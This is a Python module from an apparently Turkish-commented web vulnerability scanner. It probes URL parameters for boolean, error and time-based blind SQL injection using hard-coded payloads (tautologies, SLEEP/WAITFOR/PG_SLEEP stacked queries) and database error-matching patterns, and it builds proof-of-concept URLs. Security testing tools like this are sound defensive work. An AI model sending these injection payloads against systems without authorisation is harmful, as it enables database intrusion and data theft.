# path: core/scanners/sqli.py

import aiohttp
import asyncio
import re
from time import time # KRİTİK DÜZELTME: Sadece time() fonksiyonunu import ediyoruz
from typing import Callable, Dict, List, Tuple, Optional, Union, Set
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
import statistics # KRİTİK EKLENTİ: İstatistiksel analiz için
import math # Log2 için
import random # KRİTİK EKLENTİ: random.choice ve random.uniform için eklendi

from core.scanners.base_scanner import BaseScanner
from core.payload_generator import PayloadGenerator


class SQLiScanner(BaseScanner):
    """
    [AR-GE v2.0 - BLIND TIME-SERIES ENGINE]
    SQLi Tarayıcı — Time-Based kör atakları istatistiksel Korelasyon Analizi ile kanıtlar.
    """

    # ---------------------- Yapılandırma Sabitleri ---------------------- #

    # KRİTİK DÜZELTME: Sınıf seviyesinde limit tanımlaması eksikti.
    CONCURRENCY_LIMIT: int = 8 

    # Kontrol ve Saldırı için kullanılacak beklenen gecikmeler (saniye)
    CONTROL_DELAYS: List[float] = [1.0, 4.0, 8.0] 
    
    # Time-based payload içindeki beklenen delay (saniye)
    EXPECTED_SLEEP_DELAY: float = 10.0 # EN UZUN VE KANITLAYICI DELAY

    # Time-based için CV (varyans) eşiği — üstü ise atla (Artık Korelasyon kullanıldığı için daha az önemli)
    HIGH_VARIANCE_THRESHOLD: float = 0.70 

    # Multi-Round test sayısı
    ROUNDS: int = 3 # Her delay için 3 round
    
    # Korelasyon başarı eşiği (0.90 üzeri, saldırının lineer olduğunu kanıtlar)
    CORRELATION_THRESHOLD: float = 0.90

    # Boolean-based ve error-based sonuç farkı için min. içerik farkı
    MIN_CONTENT_DIFF_ABS: int = 80 	
    MIN_CONTENT_DIFF_RATIO: float = 0.15 

    # ---------------------- Error-based Desenleri (GENİŞLETİLMİŞ) ---------------------- #

    ERROR_PATTERNS = [
        # MySQL
        re.compile(r"mysql_fetch_array", re.IGNORECASE),
        re.compile(r"you have an error in your sql syntax", re.IGNORECASE),
        re.compile(r"sql syntax.*?near", re.IGNORECASE),
        re.compile(r"warning:\s+mysql_", re.IGNORECASE),
        re.compile(r"MySQL result index", re.IGNORECASE),
        
        # PostgreSQL
        re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE),
        re.compile(r"pg_query\(", re.IGNORECASE),
        re.compile(r"pg_fetch_array", re.IGNORECASE),
        re.compile(r"Warning:\s+pg_", re.IGNORECASE),

        # SQL Server (MSSQL)
        re.compile(r"odbc sql server driver", re.IGNORECASE),
        re.compile(r"unclosed quotation mark after the character string", re.IGNORECASE),
        re.compile(r"OLE DB.*SQL Server", re.IGNORECASE),
        re.compile(r"Warning.*mssql_", re.IGNORECASE),
        re.compile(r"Driver.*SQL[\-\_\ ]*Server", re.IGNORECASE),
        
        # Oracle
        re.compile(r"ORA-[0-9][0-9][0-9][0-9]", re.IGNORECASE),
        re.compile(r"Oracle error", re.IGNORECASE),

        # SQLite & Generic
        re.compile(r"sqlstate\[", re.IGNORECASE),
        re.compile(r"there was an error in your sql statement", re.IGNORECASE),
        re.compile(r"SQLite/JDBCDriver", re.IGNORECASE),
        re.compile(r"SQLite.Exception", re.IGNORECASE),
        re.compile(r"SQL error", re.IGNORECASE),
    ]

    # ---------------------- Boolean-based Payload Çiftleri (Genişletilmiş) ---------------------- #
    
    BOOLEAN_TESTS: List[Dict[str, str]] = [
        {
            "true": "' OR '1'='1'-- -",
            "false": "' AND '1'='0'-- -",
        },
        {
            "true": "1 OR 1=1",
            "false": "1 AND 1=0",
        },
        {
            "true": "admin' OR '1'='1",
            "false": "admin' AND '1'='0",
        },
        { 
            "true": "' OR 1=1#", 
            "false": "' AND 1=0#"
        },
        { 
            "true": "' OR 'a'='a", 
            "false": "' OR 'a'='b"
        }
    ]

    # ---------------------- Time-Based Payload Setleri ---------------------- #

    # NOT: SLEEP süresi artık dinamik olarak ayarlanacaktır. 
    # {delay_time} placeholder'ı _run_time_based_multi_round içinde doldurulacak.
    
    TIME_BASED_INT_PAYLOADS: List[str] = [
        "1 AND SLEEP({delay_time})",
        "1 WAITFOR DELAY '0:0:{delay_time}'",
        "1;SELECT PG_SLEEP({delay_time})", 
    ]

    TIME_BASED_STR_PAYLOADS: List[str] = [
        "' OR SLEEP({delay_time})-- -",
        "'; WAITFOR DELAY '0:0:{delay_time}'--",
        "';SELECT PG_SLEEP({delay_time})--", 
    ]

    TIME_BASED_GENERIC_PAYLOADS: List[str] = [
        "1); SLEEP({delay_time})-- -",
        "') OR SLEEP({delay_time})-- -",
        "1)); SLEEP({delay_time})-- -",
    ]

    def __init__(self, logger, results_callback, request_callback: Callable[[], None]):
        super().__init__(logger, results_callback, request_callback)
        
        # Engine tarafından enjekte edilecekler
        self.calibration_latency_ms: int = getattr(self, "calibration_latency_ms", 4000)
        self.latency_cv: float = getattr(self, "latency_cv", 0.0)
        self.calibration_headers: Dict[str, str] = getattr(self, "calibration_headers", {})
        self.payload_generator: Optional[PayloadGenerator] = None # FAZ 29: Engine'den enjekte edilecek
        self.discovered_params: Set[str] = set()

        # Dahili concurrency limiti (Sınıf değişkenine referans vererek düzelttik)
        self._sem = asyncio.Semaphore(self.CONCURRENCY_LIMIT)

    # ------------------------------------------------------------------ #
    # Meta
    # ------------------------------------------------------------------ #

    @property
    def name(self):
        return "SQL Injection (SQLi) Tarayıcı"

    @property
    def category(self):
        return "SQLi"

    # ------------------------------------------------------------------ #
    # Ana Giriş Noktası
    # ------------------------------------------------------------------ #

    async def scan(self, url: str, session: aiohttp.ClientSession, completed_callback: Callable[[], None]):
        """
        Hybrid SQLi tarama mantığını uygular.
        """
        if self.payload_generator is None:
            self.log(f"[{self.category}] Payload Generator enjekte edilmedi (FAZ 29 hatası). Tarama atlanıyor.", "CRITICAL")
            completed_callback()
            return
        
        try:
            # --- 1) Gürültü / Anti-Bot analizi ---
            latency_cv = getattr(self, "latency_cv", self.latency_cv)
            calib_headers = getattr(self, "calibration_headers", self.calibration_headers)

            time_based_allowed = True

            if latency_cv > self.HIGH_VARIANCE_THRESHOLD:
                self.add_result(
                    self.category,
                    "INFO",
                    (
                        f"BİLGİ: Sunucu yanıt süresi varyansı çok yüksek (CV={latency_cv:.2f}). "
                        f"Time-Based SQLi taraması istatistiksel analizle güçlendirilecek."
                    ),
                    0,
                )
            
            # Rate limit header'ları varsa time-based atla (FP kanıtlaması zor)
            for header_name in ["X-RateLimit-Limit", "Retry-After", "CF-RAY", "X-Request-Attempt"]:
                if calib_headers.get(header_name):
                    self.add_result(
                        self.category,
                        "INFO",
                        (
                            f"BİLGİ: Anti-Bot/Rate-Limit başlığı ('{header_name}') tespit edildi. "
                            f"Time-Based SQLi taraması false positive riskinden dolayı atlanacak."
                        ),
                        0,
                    )
                    time_based_allowed = False
                    break

            # --- 2) Dinamik eşik (kalibrasyon) ---
            calibration_ms = getattr(self, "calibration_latency_ms", self.calibration_latency_ms)
            baseline_threshold_s = calibration_ms / 1000.0

            if baseline_threshold_s < 4.0:
                baseline_threshold_s = 4.0

            # --- 3) Payload üretimi (AI/Context-Aware) ---
            # KRİTİK DÜZELTME: generate_sqli_payloads artık await gerektiriyor
            base_payloads = await self.payload_generator.generate_sqli_payloads() 
            contextual_payloads = self.payload_generator.generate_contextual_payloads([])
            
            generated_payloads = list(set(base_payloads + contextual_payloads))
            
            MAX_TOTAL_SQLI_PAYLOADS = 12 
            generated_payloads = generated_payloads[:MAX_TOTAL_SQLI_PAYLOADS]

            self.log(
                f"[{self.category}] Genişletilmiş Payload Havuzu: {len(generated_payloads)} adet | Baseline Eşik: "
                f"{baseline_threshold_s:.2f}s",
                "INFO",
            )

            # --- 4) Parametreleri belirle ---
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)

            discovered_params = getattr(self, "discovered_params", set())
            all_target_params = set(query_params.keys())

            for param_name in discovered_params:
                if param_name not in all_target_params:
                    query_params[param_name] = ["SYNARA_TEST_VALUE"]
                    all_target_params.add(param_name)

            if not all_target_params:
                self.add_result(
                    self.category,
                    "INFO",
                    "INFO: Taranacak sorgu parametresi (query parameter) bulunamadı.",
                    0,
                )
                completed_callback()
                return

            # --- 5) Her parametre için ayrı görev oluştur ---
            exploit_manager = getattr(self, "exploit_manager", None)

            tasks = []
            for param in all_target_params:
                tasks.append(
                    self._scan_param(
                        url=url,
                        param=param,
                        session=session,
                        parsed_url=parsed_url,
                        base_query=query_params,
                        generated_payloads=generated_payloads,
                        baseline_threshold_s=baseline_threshold_s,
                        time_based_allowed=time_based_allowed,
                        exploit_manager=exploit_manager,
                    )
                )

            if tasks:
                await asyncio.gather(*tasks)

        except Exception as e:
            error_message = f"Kritik Hata: {type(e).__name__} ({str(e)})"
            score_deduction = self._calculate_score_deduction("CRITICAL")
            self.add_result(self.category, "CRITICAL", error_message, score_deduction)
            self.log(f"[{self.category}] {error_message}", "CRITICAL")

        completed_callback()

    # ------------------------------------------------------------------ #
    # Parametre Bazlı Tarama (Eksik Metot)
    # ------------------------------------------------------------------ #
    # KRİTİK DÜZELTME: Hata alınan _scan_param metodu eklendi
    async def _scan_param(
        self,
        url: str,
        param: str,
        session: aiohttp.ClientSession,
        parsed_url,
        base_query: Dict[str, List[str]],
        generated_payloads: List[str],
        baseline_threshold_s: float,
        time_based_allowed: bool,
        exploit_manager,
    ):
        """
        Her parametre için:
        - Boolean-based testler
        - Error-based testler
        - Time-based Multi-Round testleri
        """

        # Parametre değeri üzerinden context çıkar
        original_value = ""
        if param in base_query and base_query[param]:
            original_value = base_query[param][0]

        context = self._infer_param_context(original_value)

        # 1) Boolean-based SQLi kontrolü (hafif, hızlı)
        if await self._run_boolean_based_checks(
            base_url=url,
            param=param,
            session=session,
            parsed_url=parsed_url,
            base_query=base_query,
        ):
            return # Zaten bulunduysa çık (Performans)

        # 2) Error-based / Union-based SQLi kontrolü
        if await self._run_error_based_checks(
            base_url=url,
            param=param,
            session=session,
            parsed_url=parsed_url,
            base_query=base_query,
            generated_payloads=generated_payloads,
        ):
            return

        # 3) Time-based (Son çare)
        if time_based_allowed:
            time_based_payloads = self._select_time_based_payloads_for_context(context)

            if not time_based_payloads:
                return

            # Sadece kritik payload'ları test ediyoruz
            for tb_payload in time_based_payloads[:3]: 
                await self._run_time_based_multi_round(
                    base_url=url,
                    param=param,
                    payload=tb_payload,
                    session=session,
                    parsed_url=parsed_url,
                    base_query=base_query,
                    baseline_threshold_s=baseline_threshold_s,
                    time_based_allowed=time_based_allowed,
                    exploit_manager=exploit_manager,
                )
    # ------------------------------------------------------------------ #
    # Context Analizi
    # ------------------------------------------------------------------ #

    def _infer_param_context(self, value: str) -> str:
        """
        Parametre değerinden context çıkar:
        """
        if not value:
            return "generic"

        if value.isdigit():
            return "int"

        if len(value) > 64:
            return "generic"

        return "string"

    def _select_time_based_payloads_for_context(self, context: str) -> List[str]:
        """
        Context'e göre uygun time-based payload setini seç.
        """
        if context == "int":
            return self.TIME_BASED_INT_PAYLOADS
        if context == "string":
            return self.TIME_BASED_STR_PAYLOADS
        return self.TIME_BASED_GENERIC_PAYLOADS

    # ------------------------------------------------------------------ #
    # Boolean-based SQLi
    # ------------------------------------------------------------------ #

    async def _run_boolean_based_checks(
        self,
        base_url: str,
        param: str,
        session: aiohttp.ClientSession,
        parsed_url,
        base_query: Dict[str, List[str]],
    ) -> bool:
        """
        True/False payload'larının yanıtlarını karşılaştırarak
        boolean-based SQLi şüphesini tespit etmeye çalışır.
        """

        # Orijinal yanıt referansı
        original_content, original_status = await self._send_simple_request(
            base_url, param, base_query, session, parsed_url, replacement=None
        )

        if original_status == 0:
            return False

        for test in self.BOOLEAN_TESTS:
            true_payload = test["true"]
            false_payload = test["false"]

            true_content, true_status = await self._send_simple_request(
                base_url, param, base_query, session, parsed_url, replacement=true_payload
            )
            false_content, false_status = await self._send_simple_request(
                base_url, param, base_query, session, parsed_url, replacement=false_payload
            )

            if true_status == 0 or false_status == 0:
                continue

            # Status benzer olmalı
            if true_status != false_status:
                continue

            # İçerik aynıysa bir anlam yok
            if true_content == false_content:
                continue

            # İçerik farkını hesapla
            len_true = len(true_content)
            len_false = len(false_content)
            max_len = max(len_true, len_false, 1)

            diff_abs = abs(len_true - len_false)
            diff_ratio = diff_abs / max_len

            if diff_abs >= self.MIN_CONTENT_DIFF_ABS and diff_ratio >= self.MIN_CONTENT_DIFF_RATIO:
                level = "WARNING"
                score = self._calculate_score_deduction(level)

                # YENİ: Auto-POC Verisi Hazırlama (Boolean)
                poc_params = base_query.copy()
                poc_params = {k: v[:] for k, v in poc_params.items()}
                poc_params[param] = [true_payload]
                poc_qs = urlencode(poc_params, doseq=True)
                poc_url_parts = list(parsed_url)
                poc_url_parts[4] = poc_qs
                final_poc_url = urlunparse(poc_url_parts)

                self.add_result(
                    self.category,
                    level,
                    (
                        f"RİSK: Boolean-based SQLi şüphesi. Parametre: '{param}'. "
                        f"True/False yükleri farklı yanıt üretti (Δ≈{diff_abs} byte, oran={diff_ratio:.2f}). "
                        f"Payload(OR): {true_payload}"
                    ),
                    score,
                    poc_data={
                        "url": final_poc_url,
                        "method": "GET",
                        "attack_vector": f"Boolean-Based SQLi (Param: {param})",
                        "data": None,
                        "headers": {}
                    }
                )
                return True

        return False

    # ------------------------------------------------------------------ #
    # Error-based SQLi
    # ------------------------------------------------------------------ #

    async def _run_error_based_checks(
        self,
        base_url: str,
        param: str,
        session: aiohttp.ClientSession,
        parsed_url,
        base_query: Dict[str, List[str]],
        generated_payloads: List[str],
    ) -> bool:
        """
        Yanıt gövdesinde tipik SQL hata mesajlarını arar.
        """
        candidate_payloads = generated_payloads[:50]

        for payload in candidate_payloads:
            content, status = await self._send_simple_request(
                base_url, param, base_query, session, parsed_url, replacement=payload
            )

            if status == 0:
                continue

            lower_content = content.lower()

            for pattern in self.ERROR_PATTERNS:
                if pattern.search(lower_content):
                    level = "CRITICAL"
                    score = self._calculate_score_deduction(level)

                    # YENİ: Auto-POC Verisi Hazırlama (Error-Based)
                    poc_params = base_query.copy()
                    poc_params = {k: v[:] for k, v in poc_params.items()}
                    poc_params[param] = [payload]
                    poc_qs = urlencode(poc_params, doseq=True)
                    poc_url_parts = list(parsed_url)
                    poc_url_parts[4] = poc_qs
                    final_poc_url = urlunparse(poc_url_parts)

                    self.add_result(
                        self.category,
                        level,
                        (
                            f"KRİTİK: SQL Hata Mesajı İfşası (Error-Based SQLi). Param: '{param}'. "
                            f"Payload: {payload}"
                        ),
                        score,
                        poc_data={
                            "url": final_poc_url,
                            "method": "GET",
                            "attack_vector": f"Error-Based SQLi (Param: {param})",
                            "data": None,
                            "headers": {}
                        }
                    )
                    return True
            
        return False

    # ------------------------------------------------------------------ #
    # Time-based Multi-Round SQLi (Korelasyon Kanıtı ile)
    # ------------------------------------------------------------------ #
    
    # YENİ: Pearson Korelasyonu Hesaplama (Numpy Simülasyonu)
    @staticmethod
    def _calculate_correlation(x: List[float], y: List[float]) -> float:
        """
        İki liste arasındaki Pearson Korelasyon Katsayısı'nı hesaplar.
        (Numpy simülasyonu)
        """
        if len(x) != len(y) or len(x) < 2:
            return 0.0
            
        n = len(x)
        mean_x = sum(x) / n
        mean_y = sum(y) / n
        
        sum_xy = sum([(x[i] - mean_x) * (y[i] - mean_y) for i in range(n)])
        sum_x2 = sum([(x[i] - mean_x) ** 2 for i in range(n)])
        sum_y2 = sum([(y[i] - mean_y) ** 2 for i in range(n)])
        
        denominator = math.sqrt(sum_x2 * sum_y2)
        
        if denominator == 0:
            return 0.0
            
        return sum_xy / denominator


    async def _run_time_based_multi_round(
        self,
        base_url: str,
        param: str,
        payload: str,
        session: aiohttp.ClientSession,
        parsed_url,
        base_query: Dict[str, List[str]],
        baseline_threshold_s: float,
        # strict_threshold_s kaldırıldı, artık istatistiksel kanıt kullanıyoruz.
        time_based_allowed: bool,
        exploit_manager,
    ):
        """
        Blind Time-based SQLi doğrulama: Korelasyon ve Mutlak Gecikme.
        """
        
        if not time_based_allowed:
            return

        # 1. Gecikme Serisi Hazırlığı: [0s (Kontrol)] + [1s, 4s, 8s, 10s] 
        delays_to_test = [0.0] + self.CONTROL_DELAYS + [self.EXPECTED_SLEEP_DELAY]
        
        # 2. Gerçekleşen süreleri (latency) ve Beklenen süreleri (expected time) tutacak listeler
        actual_latencies: List[float] = []
        expected_sleep_times: List[float] = [] 

        # 3. Test döngüsü (ROUNDS sayısına göre)
        for round_num in range(self.ROUNDS):
            
            # Her round'da tüm gecikme serisini test et (jitter/noise etkisini azaltmak için)
            for expected_delay in delays_to_test:
                
                # Dinamik olarak payload'ı seç ve delay'i doldur
                payload_context = self._infer_param_context("string") # Varsayılan olarak string context'i kullan
                payload_templates = self._select_time_based_payloads_for_context(payload_context)
                payload_template = random.choice(payload_templates)
                
                # Payload'ı dinamik olarak doldur
                if expected_delay == 0.0:
                    # 0s için SAFE CONTROL isteği
                    payload_to_send = ""
                else:
                    # Gecikmeli payload
                    payload_to_send = payload_template.replace("{delay_time}", str(int(expected_delay)))
                    
                # İstek gönder ve süreyi al
                duration = await self._single_timed_request(
                    base_url, param, base_query, session, parsed_url, replacement=payload_to_send
                )
                
                if duration is None: continue
                
                # Veri noktalarını kaydet
                actual_latencies.append(duration)
                
                # Beklenen toplam süre (baseline + gecikme)
                expected_total_time = (baseline_threshold_s + expected_delay) 
                expected_sleep_times.append(expected_total_time)
        
        # 4. İstatistiksel Analiz
        if len(actual_latencies) < 6: return # Yeterli veri toplanmadı
        
        # Pearson Korelasyon Katsayısı (Beklenen gecikme ile Gerçekleşen süre arasındaki ilişki)
        correlation = self._calculate_correlation(expected_sleep_times, actual_latencies)
        
        # Mutlak Gecikme Kontrolü (En uzun sleep payload'ının ortalaması)
        # Sadece beklenen gecikmenin olduğu noktaların ortalamasını alıyoruz
        avg_delay_on_max_sleep = statistics.mean([
            actual_latencies[i] for i, exp_time in enumerate(expected_sleep_times) 
            if exp_time >= baseline_threshold_s + self.EXPECTED_SLEEP_DELAY
        ])

        # 5. KARAR NOKTASI (FP-Zero)
        
        is_high_correlation = correlation >= self.CORRELATION_THRESHOLD
        is_sufficiently_slow = avg_delay_on_max_sleep >= baseline_threshold_s + (self.EXPECTED_SLEEP_DELAY * 0.8) # %80'den fazla gecikme
        
        if is_high_correlation and is_sufficiently_slow:
            level = "CRITICAL"
            score = self._calculate_score_deduction(level)
            
            # YENİ: Auto-POC Verisi Hazırlama (Time-Based)
            # En son kullanılan payload_to_send (genelde max delay) ile URL oluşturuyoruz
            poc_params = base_query.copy()
            poc_params = {k: v[:] for k, v in poc_params.items()}
            poc_params[param] = [payload_to_send]
            poc_qs = urlencode(poc_params, doseq=True)
            poc_url_parts = list(parsed_url)
            poc_url_parts[4] = poc_qs
            final_poc_url = urlunparse(poc_url_parts)

            self.add_result(
                self.category,
                level,
                (
                    f"KANITLANMIŞ Time-Based SQLi! Param: '{param}'. "
                    f"Korelasyon (Kanıt): {correlation:.2f} (Eşik: {self.CORRELATION_THRESHOLD:.2f}). "
                    f"Ort. Gecikme: {avg_delay_on_max_sleep:.2f}s."
                ),
                score,
                poc_data={
                    "url": final_poc_url,
                    "method": "GET",
                    "attack_vector": f"Time-Based SQLi (Param: {param})",
                    "data": None,
                    "headers": {}
                }
            )
            # Yapay Zeka Konsültasyonu (Güvenli Asenkron Çağrı)
            if hasattr(self, 'neural_engine') and self.neural_engine.is_active: 
                asyncio.create_task(self.neural_engine.analyze_vulnerability({
                    "category": self.category,
                    "message": f"Time-Based SQLi kanıtlandı. Payload: {payload_to_send}",
                    "metrics": f"Correlation: {correlation:.2f}, Avg Delay: {avg_delay_on_max_sleep:.2f}s"
                }))
            
            return
        
        # 6. Başarısızlık Logu (FP değil, sadece bilgi)
        self.log(
            f"[{self.category}] Time-Based Sinyal Zayıf (Param: {param}). Korelasyon: {correlation:.2f}. "
            f"Avg Delay: {avg_delay_on_max_sleep:.2f}s. Kanıt yetersiz.",
            "INFO"
        )
        


    # ------------------------------------------------------------------ #
    # Yardımcı İstek Fonksiyonları
    # ------------------------------------------------------------------ #

    async def _send_simple_request(
        self,
        base_url: str,
        param: str,
        base_query: Dict[str, List[str]],
        session: aiohttp.ClientSession,
        parsed_url,
        replacement: Optional[str],
    ) -> Tuple[str, int]:
        """
        İçerik odaklı (boolean/error-based) istek gönderir.
        """

        # Query paramlarını yeniden oluştur
        test_params = base_query.copy()
        test_params = {k: v[:] for k, v in test_params.items()} 

        if replacement is not None:
            # KRİTİK: Replacement payload'ını URL encode etme, payload generator zaten ediyor
            test_params[param] = [replacement] 

        query_str = urlencode(test_params, doseq=True)
        url_parts = list(parsed_url)
        url_parts[4] = query_str
        test_url = urlunparse(url_parts)

        # BURADAKİ QPS KONTROLÜ İÇİN _throttled_request kullanılmalı
        # Ancak _throttled_request kendi içinde concurrency semaforu kullanmaz.
        # Bu yüzden burada harici semafor ile koruyoruz.
        try:
            async with self._sem:
                response, _ = await self._throttled_request(session, "GET", test_url, allow_redirects=True)
            if response is None:
                return "", 0

            text = await response.text()
            return text, response.status

        except Exception as e:
            self.log(
                f"[{self.category}] Boolean/Error istek hatası ({type(e).__name__}): {str(e)}",
                "WARNING",
            )
            return "", 0

    async def _single_timed_request(
        self,
        base_url: str,
        param: str,
        base_query: Dict[str, List[str]],
        session: aiohttp.ClientSession,
        parsed_url,
        replacement: str,
    ) -> Optional[float]:
        """
        Time-based round için tek bir istatistik toplayan fonksiyon.
        Dönüş: süre (saniye) veya None (hata).
        """
        test_params = base_query.copy()
        test_params = {k: v[:] for k, v in test_params.items()}

        test_params[param] = [replacement] # Payload encode edilmedi

        query_str = urlencode(test_params, doseq=True)
        url_parts = list(parsed_url)
        url_parts[4] = query_str
        test_url = urlunparse(url_parts)

        try:
            start = time() # KRİTİK DÜZELTME: time.time() -> time()
            async with self._sem:
                # Time-based testlerde gövde içeriği önemli değildir. Sadece süreyi ölç.
                response, _ = await self._throttled_request(session, "GET", test_url) 
                
            if response is None:
                return None

            # Gövdeyi okuyalım ki Sunucu tamamen yanıtlasın
            await response.text()
            end = time() # KRİTİK DÜZELTME: time.time() -> time()
            return end - start

        except Exception as e:
            self.log(
                f"[{self.category}] Time-based istek hatası ({type(e).__name__}): {str(e)}",
                "WARNING",
            )
            return None
            
    # consult_ai metodu tamamen kaldırıldı ve çağrıları yukarıda asenkron olarak düzenlendi.

    def _calculate_score_deduction(self, level: str) -> float:
        """SRP puanını hesaplar (Engine'deki mantığın bir kopyası)."""
        weight = self.engine_instance.MODULE_WEIGHTS.get(self.category, 0.0)
        if level == "CRITICAL":
            return weight
        elif level == "HIGH":
            return weight * 0.7
        else: # WARNING
            return weight * 0.3